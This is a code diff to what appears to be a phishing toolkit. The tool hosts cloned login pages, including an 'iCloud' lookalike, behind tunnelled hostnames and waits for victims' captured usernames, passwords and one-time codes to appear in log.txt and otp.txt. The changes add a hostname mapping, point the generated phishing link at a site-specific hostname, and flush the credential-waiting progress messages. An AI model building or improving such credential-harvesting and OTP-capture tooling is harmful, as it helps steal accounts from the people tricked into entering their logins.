@@ -30,6 +30,7 @@ HOSTNAME_SITE_MAP = {
 	"datacloudeasy.dylansdecoded.com": "DataCloudEasy",
 	"www.datacloudeasy.dylansdecoded.com": "DataCloudEasy",
 	"icloud-test.dylansdecoded.com": "iCloud",
+	"www.icloud-test.dylansdecoded.com": "iCloud",
 }
 
 try:
@@ -870,8 +871,14 @@ sleep 8""".format(cf_binary, cf_tunnel_name))
 
 		os.chdir("sites/{}".format(action))
 		
+		site_hostname = cf_hostname
+		for h, s in hostname_map.items():
+			if s == action:
+				site_hostname = h
+				break
+		
 		with open("link.txt", "w") as f:
-			f.write("https://{}".format(cf_hostname))
+			f.write("https://{}".format(site_hostname))
 
 
 	elif (tunnel == 4):
@@ -1007,13 +1014,13 @@ def work():
 	try:
 		print("")
 		while not (os.path.exists("log.txt")):
-			print("\r\033[1;92mWaiting for the credentials   \033[0;0m",end="")
+			print("\r\033[1;92mWaiting for the credentials   \033[0;0m",end="",flush=True)
 			time.sleep(1)
-			print("\r\033[1;92mWaiting for the credentials.  \033[0;0m",end="")
+			print("\r\033[1;92mWaiting for the credentials.  \033[0;0m",end="",flush=True)
 			time.sleep(1)
-			print("\r\033[1;92mWaiting for the credentials.. \033[0;0m",end="")
+			print("\r\033[1;92mWaiting for the credentials.. \033[0;0m",end="",flush=True)
 			time.sleep(1)
-			print("\r\033[1;92mWaiting for the credentials...\033[0;0m",end="")
+			print("\r\033[1;92mWaiting for the credentials...\033[0;0m",end="",flush=True)
 			time.sleep(1)
 			if (os.path.exists("log.txt") == True):
 				print("\r\033[1;92mCredentials found.            \033[0;0m")
@@ -1042,13 +1049,13 @@ def work_otp():
 			username, password = extract_data(log)
 
 		while not (os.path.exists("otp.txt")):
-			print("\r\033[1;92mWaiting for the otp   \033[0;0m",end="")
+			print("\r\033[1;92mWaiting for the otp   \033[0;0m",end="",flush=True)
 			time.sleep(1)
-			print("\r\033[1;92mWaiting for the otp.  \033[0;0m",end="")
+			print("\r\033[1;92mWaiting for the otp.  \033[0;0m",end="",flush=True)
 			time.sleep(1)
-			print("\r\033[1;92mWaiting for the otp.. \033[0;0m",end="")
+			print("\r\033[1;92mWaiting for the otp.. \033[0;0m",end="",flush=True)
 			time.sleep(1)
-			print("\r\033[1;92mWaiting for the otp...\033[0;0m",end="")
+			print("\r\033[1;92mWaiting for the otp...\033[0;0m",end="",flush=True)
 			time.sleep(1)
 			if (os.path.exists("otp.txt") == True):
 				print("\r                                             ",end="\r")
